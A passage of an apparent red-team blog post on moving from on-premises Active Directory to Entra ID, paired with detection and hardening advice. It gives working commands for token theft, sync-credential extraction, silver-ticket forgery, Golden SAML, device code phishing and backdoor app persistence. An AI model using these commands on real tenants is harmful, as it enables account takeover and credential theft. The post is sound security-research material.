+- The subsequent use of the extracted tokens from unexpected IP addresses
+
+---
+
+### Token Extraction from Browser Memory and Storage
+
+Web browsers are perhaps the richest source of Entra ID tokens on a typical enterprise workstation, because users authenticate to web-based Microsoft 365 applications (Exchange on the Web, Azure Portal, SharePoint) through the browser, leaving tokens in multiple storage locations.
+
+**Storage locations:**
+
+**Browser memory:** Active browser sessions hold access tokens in JavaScript heap memory within the tab's renderer process. These are accessible via process memory scanning (same technique as above) or, more elegantly, via the Chrome DevTools Protocol (CDP) if the browser is running with remote debugging enabled.
+
+**Local Storage / Session Storage:** Single-page applications (like the Exchange Online web interface) store tokens in browser Local Storage or Session Storage. These are accessible via:
+- Browser extension APIs (if a malicious or compromised extension is present)
+- The DevTools console (`localStorage.getItem('token')` or scanning all LocalStorage keys)
+- Reading the Chrome/Edge profile database files from disk
+
+**IndexedDB:** MSAL.js (the browser-side MSAL library used by Azure portal and modern Microsoft 365 web apps) stores its token cache in IndexedDB. The cache file is stored on disk at:
+```
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\IndexedDB\
+%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\IndexedDB\
+```
+
+The MSAL.js cache in IndexedDB contains serialized JSON with access tokens, refresh tokens, and account metadata. Reading this file (requires the browser to be closed, or copying a locked file via VSS) provides a full token inventory.
+
+```python
+# Conceptual: Read MSAL.js token cache from Edge IndexedDB
+# The cache is stored in LevelDB format within the IndexedDB directory
+import leveldb
+
+db = leveldb.LevelDB('/path/to/msal.cache.ldb')
+for key, value in db.RangeIter():
+    if b'accesstoken' in key or b'refreshtoken' in key:
+        print(f"Token found: {value}")
+```
+
+**Browser Credential Store:** Edge stores Entra ID refresh tokens through its integration with the Windows WAM. These tokens are in the Windows Credential Manager under entries prefixed with `Microsoft_OAuthXXXXX`. They can be read by any process running as the user:
+
+```powershell
+# Enumerate OAuth tokens in Windows Credential Manager
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]$null
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | Where-Object { $_.Resource -like "*Microsoft*" -or $_.Resource -like "*Azure*" }
+```
+
+**Chrome/Edge Cookies:** For web-based SSO (where authentication uses session cookies rather than in-memory tokens), the `x-ms-RefreshTokenCredential` cookie and the `ESTSAUTH`/`ESTSAUTHPERSISTENT` cookies represent active Entra ID sessions. These cookies are stored encrypted in the browser's cookie database (`Cookies` SQLite file) using the DPAPI-protected browser encryption key.
+
+Tools like `SharpChromium`, `CookieMonster`, and custom DPAPI-decryption scripts automate the extraction of these cookies from the browser profile.
+
+---
+
+### Abusing Azure AD Connect (Entra Connect)
+
+The Entra Connect server is arguably the single highest-value lateral movement target in a hybrid environment. Compromise of the Entra Connect server provides:
+
+1. **The MSOL_* service account credentials** — a highly privileged on-premises account used for directory synchronization.
+2. **The Azure AD Connector account credentials** — the cloud-side service account that has the `Directory Synchronization Accounts` role in Entra ID.
+3. **The ADSync configuration database** — which contains encrypted credentials for both of the above.
+4. **Potential for AZUREADSSOACC$ credential exposure** — the Seamless SSO computer account key is stored on the Entra Connect server.
+
+**Extracting credentials from the ADSync database:**
+
+The ADSync local database (SQL Server LocalDB by default, or a full SQL instance) stores connector credentials encrypted with DPAPI using the machine's key. With local admin on the Entra Connect server:
+
+```powershell
+# Using AADInternals to extract credentials
+Import-Module AADInternals
+
+# If running as local admin on the ADSync server:
+$creds = Get-AADIntSyncCredentials
+$creds | Format-List
+# Returns: AADUserName, AADPassword, ADDomain, ADUserName, ADPassword
+```
+
+The `AADPassword` field is the Azure AD Connector account credential — an OAuth2 client credential that can be used to directly authenticate as the synchronization service account to the Entra ID Graph API.
+
+**Privilege escalation via the sync account:**
+
+The `Directory Synchronization Accounts` role is intentionally highly privileged — it needs to write synchronized attributes including password hashes. Using this account's credentials, an attacker can:
+
+```powershell
+# Log in to Entra ID as the sync account
+$accessToken = Get-AADIntAccessTokenForAADGraph -Credentials $syncCreds
+
+# Reset the password of the Global Administrator
+Set-AADIntUserPassword -AccessToken $accessToken `
+    -UserPrincipalName "globaladmin@company.onmicrosoft.com" `
+    -Password "NewPassword123!"
+```
+
+This effectively provides Global Administrator access to the Entra ID tenant through a path that bypasses MFA (the sync account typically has Conditional Access excluded or its own credential set), persistent replication relationships, and all user-facing protections.
+
+---
+
+### DCSync to Cloud via Password Hash Sync
+
+When Password Hash Synchronization is enabled, the Entra Connect server runs a process that replicates NTLM and Kerberos password hashes from on-premises AD to Entra ID. This synchronization uses the `MSOL_*` service account to perform a DC Replication (`GetNCChanges`) operation against all Domain Controllers — effectively a DCSync for the cloud.
+
+**Attack path:**
+
+If an attacker already has DCSync capability (Domain Admin, Domain Controller, MSOL account), they can:
+
+1. Run DCSync against the domain to extract all password hashes.
+2. Identify users who are synchronized to Entra ID (the `mS-DS-ConsistencyGuid` or `ObjectGUID` attribute is used as the ImmutableID in Entra ID).
+3. Attempt to authenticate to Entra ID directly with the extracted credential material.
+
+With PHS enabled, the NTLM hash is not directly usable — Entra ID stores a different derived hash. However, if the attacker can crack the NTLM hash (or has obtained the cleartext password via other means), they can authenticate to Entra ID with the user's password directly.
+
+**PHS hash extraction:**
+
+For direct hash extraction from Entra ID's PHS store (which requires extremely high privilege — essentially Entra ID Global Admin), the synchronized password hash can theoretically be extracted. However, this is a less practical path than leveraging the Entra Connect credentials directly.
+
+---
+
+### Pass-the-Hash to Cloud via Seamless SSO (AZUREADSSOACC$)
+
+This is one of the most elegant hybrid lateral movement techniques and a clear illustration of how on-premises security weaknesses translate to cloud compromise.
+
+**Background:**
+
+Seamless SSO introduces a computer account named `AZUREADSSOACC$` into the on-premises domain. This account acts as a Kerberos service principal: when a domain-joined device needs to authenticate silently to Entra ID, it requests a Kerberos service ticket (TGS) for `AZUREADSSOACC$` from the on-premises KDC, and presents this ticket to `https://autologon.microsoftonline.com`.
+
+Entra ID validates the Kerberos ticket using the shared secret of `AZUREADSSOACC$` (its NTLM hash / Kerberos key), and if valid, issues tokens for the user identified in the ticket's PAC.
+
+**The attack:**
+
+If an attacker obtains the NTLM hash of `AZUREADSSOACC$` (via DCSync, secretsdump, or extracting it from the Entra Connect server), they can forge a Kerberos silver ticket for any domain user:
+
+```bash
+# Step 1: Get AZUREADSSOACC$ hash via DCSync
+secretsdump.py domain/admin@dc01.company.local -just-dc-user AZUREADSSOACC$
+
+# Output: AZUREADSSOACC$:502:aad3b435b51404eeaad3b435b51404ee:7ADE4B9F6E[...]
+
+# Step 2: Forge a silver ticket for the target user
+ticketer.py -nthash 7ADE4B9F6E[...] \
+    -domain company.local \
+    -domain-sid S-1-5-21-... \
+    -spn "AZUREADSSOACC$/company.local" \
+    -user targetuser@company.com \
+    targetuser@company.com
+
+# Step 3: Use the ticket to get Entra ID tokens
+# Present the ticket to autologon.microsoftonline.com
+```
+
+Using `AADInternals` to complete the token exchange:
+
+```powershell
+# Use the silver ticket to obtain Entra ID tokens
+$KerberosTicket = [Convert]::ToBase64String([IO.File]::ReadAllBytes("targetuser.ccache"))
+Get-AADIntAccessTokenWithKerberosTicket -KerberosTicket $KerberosTicket `
+    -Domain "company.onmicrosoft.com"
+```
+
+**Why this is devastating:** Unlike PRT theft which requires physical access to a device, this attack can be performed entirely remotely once the `AZUREADSSOACC$` hash is known. And because the forged ticket's PAC contains the target user's UPN, Entra ID will issue tokens with that user's full privileges — including Global Admin if you target the right account.
+
+**Critical note:** `AZUREADSSOACC$` typically has its password rotated every 30 days by Entra Connect. But in practice, many organizations have older `AZUREADSSOACC$` hashes in their environment because the rotation failed or was never configured correctly. Always check the password last set date.
+
+---
+
+### Device Code Phishing
+
+Device code phishing is a social engineering technique that abuses the OAuth2 Device Authorization Grant flow. While not strictly a "lateral movement from AD" technique, it frequently appears in hybrid engagements as a means to obtain initial Entra ID access or to escalate privileges.
+
+**The flow:**
+
+1. The attacker generates a device code by calling:
+   ```
+   POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
+   Body: client_id=<legitimate app ID>&scope=<target scopes>
+   ```
+
+2. Entra ID returns a `device_code` (for the attacker) and a `user_code` (for the victim) along with the URL `https://microsoft.com/devicelogin`.
+
+3. The attacker sends the victim a phishing message instructing them to visit `https://microsoft.com/devicelogin` and enter the `user_code`. The message is crafted to appear legitimate — "IT Support needs to verify your account," etc.
+
+4. The victim authenticates (including completing MFA) and enters the user code.
+
+5. The attacker polls `https://login.microsoftonline.com/common/oauth2/v2.0/token` with the `device_code` and receives the victim's access token and refresh token — including MFA claims.
+
+**Why this bypasses MFA:** The victim performs the MFA step as part of the legitimate authentication at `microsoft.com/devicelogin`. The resulting tokens include `mfa` in the `amr` (authentication method reference) claims, satisfying CA policies that require MFA.
+
+Tools like `TokenTactics` and `AADInternals` include device code phishing functionality with automated polling.
+
+---
+
+### Abusing Managed Identities from Compromised Workloads
+
+If the attack path leads through an Azure-hosted workload (VM, App Service, Function App, Container Instance), Managed Identities become a high-value target.
+
+A Managed Identity is an automatically provisioned Entra ID identity for an Azure resource. It has no password — authentication is performed via the Azure Instance Metadata Service (IMDS) endpoint accessible only from within the resource:
+
+```bash
+# From within a compromised Azure VM:
+curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+    -H "Metadata: true"
+
+# Returns an access token for Azure Resource Manager
+```
+
+The permissions of a managed identity depend entirely on what Azure RBAC roles and Entra ID app roles have been assigned to it. In misconfigured environments, managed identities with Contributor, Owner, or even Global Admin roles are not uncommon. Tools like `MicroBurst`, `ROADrecon`, and `AzureHound` enumerate managed identity permissions during post-exploitation.
+
+---
+
+### Federation Trust Abuse: Golden SAML
+
+Golden SAML is the cloud analog of a Golden Ticket. Where a Golden Ticket exploits the Kerberos KDC trust relationship to forge TGTs, Golden SAML exploits the federation trust between Entra ID and an on-premises STS (typically AD FS) to forge SAML assertions that Entra ID accepts as proof of authentication.
+
+**Prerequisites:** The private key of the AD FS token-signing certificate. This key is stored in the AD FS configuration database (accessible to AD FS service account or Domain Admin) and potentially in the Windows Certificate Store on the AD FS server.
+
+```powershell
+# Export the AD FS token-signing certificate from the AD FS server
+# Requires AD FS service account privileges or Domain Admin
+Export-PfxCertificate -Cert (Get-AdfsCertificate -CertificateType Token-Signing) `
+    -FilePath "c:\signing.pfx" -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)
+```
+
+Using `AADInternals` to forge a SAML response and exchange it for Entra ID tokens:
+
+```powershell
+# Create a Golden SAML token for an arbitrary user
+$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("signing.pfx","pass")
+$saml = New-AADIntSAMLToken -IssuerUri "http://sts.company.local/adfs/services/trust" `
+    -UserPrincipalName "globaladmin@company.onmicrosoft.com" `
+    -Certificate $cert
+
+# Exchange SAML for Entra ID access token
+$tokens = Get-AADIntAccessTokenWithSAML -SAMLToken $saml `
+    -Resource "https://graph.microsoft.com"
+```
+
+The resulting tokens are fully valid, include MFA claims (the SAML assertion can specify any `authnContext`), and are indistinguishable from legitimately issued tokens. This is why Golden SAML is considered one of the most impactful attacks in the hybrid identity space — the cloud service trusts the federation server's assertion unconditionally.
+
+**Historical context:** Golden SAML was made famous by the SolarWinds/SUNBURST intrusion in late 2020, where threat actors (later attributed to APT29/Cozy Bear) used this technique to generate tokens for Microsoft 365 services after compromising the on-premises AD FS infrastructure.
+
+---
+
+## Post-Exploitation in Entra ID
+
+### Enumerating the Cloud Environment
+
+Once initial cloud access is established, systematic enumeration is critical. The primary tools for Entra ID post-exploitation enumeration are:
+
+**AzureHound** (from the BloodHound team) — collects Entra ID and Azure relationships and ingests them into BloodHound for attack path analysis:
+
+```bash
+azurehound -u "user@company.com" -p "password" list --tenant "company.onmicrosoft.com" -o output.json
+```
+
+**ROADrecon** — comprehensive Entra ID enumeration tool built on roadtools:
+
+```bash
+# Authenticate using a refresh token
+roadrecon auth --refresh-token "0.AQEAi..."
+
+# Enumerate the tenant
+roadrecon gather
+
+# Launch the GUI explorer
+roadrecon gui
+```
+
+**AADInternals** enumeration functions:
+
+```powershell
+# Get tenant information
+Get-AADIntTenantDetails
+
+# Enumerate users (no auth required for some endpoints)
+Get-AADIntUsers -AccessToken $token
+
+# List conditional access policies
+Get-AADIntConditionalAccessPolicies -AccessToken $token
+
+# Check SSPR and MFA enrollment
+Get-AADIntUserMFAEnrollments -AccessToken $token -UserPrincipalName "admin@company.com"
+```
+
+### Privilege Escalation in Entra ID
+
+Common privilege escalation paths within Entra ID:
+
+**Application Admin → Global Admin:** An Application Administrator can add credentials (client secrets, certificates) to any application registration. If a Global Admin has consented to an application, adding credentials to that application and authenticating as the app (application permissions, not delegated) provides Global Admin-equivalent Microsoft Graph access.
+
+**Privileged Role Administrator → Global Admin:** The Privileged Role Administrator role can assign all roles except Global Admin directly — but can assign roles to applications and service principals that have backdoor access.
+
+**Azure RBAC Owner → Entra ID:** An Azure subscription Owner can create managed identities and assign them Entra ID roles (if the permission `microsoft.directory/servicePrincipals/managePermissionGrantsForAll.microsoft-application-admin` is in scope).
+
+**Password Administrator → Privileged User escalation:** A Password Administrator can reset passwords for all non-admin users. If a non-admin user has been delegated privileged app consent or has access to sensitive automation runbooks, resetting their password provides indirect escalation.
+
+### Persistence Mechanisms
+
+**OAuth App Registration with credentials:** Register a new OAuth application, grant it application permissions (not delegated), and add a certificate or client secret. This creates an authentication path that survives user password resets and MFA enforcement:
+
+```powershell
+# Create backdoor app registration
+$app = New-AADIntApplication -DisplayName "Windows Update Service" `
+    -ReplyURL "https://localhost"
+
+# Add a client secret
+$secret = Add-AADIntApplicationClientSecret -ApplicationId $app.appId
+
+# Grant Global Admin consent to Microsoft Graph
+Add-AADIntApplicationPermission -ApplicationId $app.appId `
+    -ResourceId "00000003-0000-0000-c000-000000000000" `  # Graph
+    -PermissionId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"  # RoleManagement.ReadWrite.Directory
+
+# Authenticate as the app (survives user account changes)
+$appToken = Get-AADIntAccessTokenForMSGraph -ClientId $app.appId -ClientSecret $secret.secretText
+```
+
+**Alternative MFA method enrollment:** Adding a FIDO2 key, new phone number, or alternative email for SSPR/MFA to a compromised account creates a persistent authentication factor that survives password resets:
+
+```powershell
+# Register a new MFA phone number for a user
+Set-AADIntUserMFAPhoneNumber -AccessToken $token `
+    -UserPrincipalName "admin@company.com" `
+    -PhoneNumber "+1-555-0100"
+```
+
+**Privileged guest account:** Creating a guest user (B2B) with a personal Microsoft account that you control, then assigning it a privileged role, creates a persistence path completely independent of the corporate identity infrastructure.
+
+---
+
+## Detection and Defensive Recommendations
+
+### Detecting PRT Theft and Pass-the-PRT
+
+**LSASS access monitoring:** Pass-the-PRT via Mimikatz requires LSASS memory access. Monitor for processes accessing LSASS with `PROCESS_VM_READ` permissions via Microsoft Defender for Endpoint's process access events, Sysmon Event ID 10, or ETW (Microsoft-Windows-Kernel-Process).
+
+**Unusual device-token correlation:** Entra ID sign-in logs include both the device ID (from the PRT) and the IP address of the request. A PRT from a known device appearing from an unusual IP address (especially if geographically impossible given the device's last known location) is a strong signal.
+
+**PRT usage from multiple locations simultaneously:** Two simultaneous sessions on the same device's PRT from different IPs indicates token theft.
+
+**Entra ID sign-in log fields to monitor:**
+- `deviceDetail.deviceId` — cross-reference with known device location
+- `authenticationDetails` containing `authenticationMethod: Primary Refresh Token`
+- `riskEventTypes` — Identity Protection's risk signals for PRT misuse
+- `conditionalAccessStatus` — should be `success` for policy-compliant devices; failure from unexpected devices indicates bypass attempts
+
+### Detecting Entra Connect Abuse
+
+**Monitor the MSOL_* account:** The sync service account should only authenticate from the Entra Connect server's IP address and should follow a predictable, machine-driven pattern. Any interactive logon or authentication from an unexpected IP should trigger immediate escalation.
+
+**ADSync database access:** Monitor file system access to the ADSync database files (`C:\Program Files\Microsoft Azure AD Sync\Data\`) and the Windows Registry keys containing the sync configuration.
+
+**Privileged operations from sync account:** The sync account (`Directory Synchronization Accounts` role) should never perform operations like password resets or role assignments. Alert on any Graph API calls from this account outside of its expected replication operations.
+
+### Detecting AZUREADSSOACC$ Attacks
+
+**Password age monitoring:** `AZUREADSSOACC$` should have its password rotated every 30 days by Entra Connect. Alert on accounts where `pwdLastSet` is older than 30 days.
+
+**Kerberos ticket anomalies:** TGS requests for `AZUREADSSOACC$` from unusual systems or at unusual times. Standard behavior is domain-joined workstations requesting TGS during SSO flows. A DC or server requesting this ticket is anomalous.
+
+**Entra ID sign-in logs:** Seamless SSO authentications appear with `ssoExtensionType: seamlessSso` in the sign-in logs. A burst of Seamless SSO authentications for many different users from a single source IP indicates silver ticket abuse.
+
+### Detecting Token Extraction from Process Memory
+
+**Cross-process memory reads:** Monitor for one process reading the memory of `OUTLOOK.EXE`, `Teams.exe`, or browser processes via Sysmon Event ID 10 or EDR process access telemetry.
+
+**Token use from unexpected IPs:** Access tokens extracted from process memory and used from the attacker's infrastructure will appear in Entra ID sign-in logs with a different IP than the device's normal egress. The token's `deviceid` claim will be present (as it was legitimately issued to the device) but the source IP will differ.
+
+**MSAL token cache file access:** Browser IndexedDB and localStorage directories should not be accessed by non-browser processes. Alert on access to `%LOCALAPPDATA%\*\User Data\Default\IndexedDB\` by unexpected processes.
+
+### General Entra ID Hardening
+
+**Enable Entra ID Identity Protection:** The risk-based CA policies that Identity Protection enables are the most effective automated defense against token theft. Configure "High Risk User" policies to require password change and "High Risk Sign-in" to require MFA step-up.
+
+**Enable CAE for all applications:** Continuous Access Evaluation shrinks the token theft window from 60-75 minutes to near-real-time revocation for supporting applications.
+
+**Protect the Entra Connect server:** Treat the Entra Connect server as a Tier-0 asset equivalent to a Domain Controller. Apply the same hardening: no internet access, Credential Guard, PAW (Privileged Access Workstation) for management, LAPS for local admin, EDR with advanced memory protection.
+
+**Enable Microsoft Defender for Identity (MDI) on the Entra Connect server:** MDI's sensor on the Entra Connect server provides specific detection for sync credential extraction and MSOL account anomalies.
+
+**Rotate AZUREADSSOACC$ regularly:** Verify that Entra Connect's automatic rotation is functioning. Consider configuring a custom rotation schedule with monitoring. If Seamless SSO is not required (PHS or PTA may function without it), consider disabling it.
+
+**Audit federation configuration:** Regularly review federation trust relationships. Any changes to federation settings should trigger alerts. Consider using Entra ID's Protected Actions feature to require phish-resistant MFA for federation configuration changes.
+
+**Implement Privileged Identity Management (PIM):** JIT (Just-in-Time) activation of privileged roles with approval workflows and time-bounded access significantly reduces the blast radius of token theft targeting privileged accounts. A stolen token for an account with no active role assignments has limited value.
+
+**Monitor for new OAuth app registrations:** Any new application registration with high-permission consent should trigger review. Configure Entra ID's "Admin consent required" policy for all Graph API permissions to prevent unilateral consent grants.
+
+---
+
+## Conclusion
+
+Hybrid Active Directory environments represent one of the most complex attack surfaces in enterprise security. The bridge between on-premises AD and Entra ID — built from Entra Connect, Seamless SSO, device registration, and federation — introduces lateral movement primitives that do not map cleanly onto either the on-premises or cloud security models.
+
+The key takeaways from this research:
+
+**The PRT is the master credential.** On Hybrid Entra ID Joined devices, the PRT is more valuable than the user's password. It provides persistent, device-identity-bearing access to all Entra ID resources without further credential challenges. Protecting LSASS and TPM key material on these devices is paramount.
+
+**The Entra Connect server is Tier-0.** Compromise of the sync server provides a direct path to Global Administrator via the sync service account credentials and the AZUREADSSOACC$ account. It should be protected, monitored, and accessed exclusively from Privileged Access Workstations.
+
+**Tokens are everywhere.** Microsoft 365's deep integration into daily workflows means that access tokens for cloud resources are abundant in process memory, browser storage, and Windows credential stores on any active user's workstation. Standard user code execution is often sufficient for cloud access without any privilege escalation.
+
+**Cloud persistence is independent.** An attacker who establishes cloud persistence (rogue OAuth apps, alternative MFA factors, guest accounts) before on-premises remediation begins can maintain cloud access indefinitely. Incident response for hybrid environments must address both planes simultaneously.
+
+**Detection requires log integration.** Entra ID sign-in logs, Microsoft 365 Unified Audit Logs, and Defender for Identity alerts must be ingested into the SIEM alongside on-premises event logs. Token theft attacks are invisible to on-premises detection — the only trace is in cloud authentication logs.
+
+The maturity gap between on-premises AD security and hybrid/cloud identity security is real and significant. Organizations that have invested heavily in AD hardening but have not extended that rigor to their Entra Connect infrastructure, device registration policies, and cloud authentication monitoring are operating with a well-fortified on-premises perimeter and an unmonitored back door.
+
+---
+
+*The research and techniques described in this post were conducted in authorized lab environments and are intended for security professionals performing authorized penetration tests and red team assessments. Always obtain proper written authorization before testing these techniques.*
+
+---
+
+### Tools Reference
+
+| Tool | Purpose | Source |
+|------|---------|--------|
+| **AADInternals** | Comprehensive Entra ID offensive toolkit | github.com/Gerenios/AADInternals |
+| **ROADtools / roadtx** | Token manipulation, enumeration | github.com/dirkjanm/ROADtools |
+| **AzureHound** | Entra ID + Azure graph collection for BloodHound | github.com/BloodHoundAD/AzureHound |
+| **TokenTactics** | OAuth2 token manipulation | github.com/rvrsh3ll/TokenTactics |
+| **Mimikatz** | PRT/session key extraction (`sekurlsa::cloudap`) | github.com/gentilkiwi/mimikatz |
+| **ROADrecon** | Entra ID tenant enumeration | github.com/dirkjanm/ROADtools |
+| **MicroBurst** | Azure post-exploitation | github.com/NetSPI/MicroBurst |
+| **impacket** | DCSync, silver ticket forge | github.com/fortra/impacket |
+| **SharpChromium** | Browser credential extraction | github.com/djhohnstein/SharpChromium |
+| **TokenFinder** | Process memory token extraction | (various PoC implementations) |
+| **Stormspotter** | Azure/Entra attack path analysis | github.com/Azure/Stormspotter |
+
+### Further Reading
+
+- **Dirk-jan Mollema (@_dirkjan)** — Research on PRT internals, WANBAN, ROADtools suite
+- **Dr. Nestori Syynimaa (@DrAzureAD)** — AADInternals, Seamless SSO attacks, PRT deep dives
+- **Tomer Nahum & Tal Be'ery** — "Pass-the-PRT Attack and Defense in Numbers" (CyberArk Research)
+- **CrowdStrike** — "Golden SAML Revisited: The Solorigate Connection"
+- **Steve Borosh (@424f424f)** — TokenTactics and FOCI abuse
+- **Nestori Syynimaa** — "AZUREADSSOACC: Attack and Defense" (TROOPERS conference)
+- **Microsoft Documentation** — "What is a Primary Refresh Token?" (`docs.microsoft.com`)
+- **Mandiant** — "Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments"
+- **Andy Robbins (@_wald0)** — AzureHound and BloodHound Entra ID integration
+- **Microsoft Identity Protection** — `docs.microsoft.com/en-us/azure/active-directory/identity-protection/`
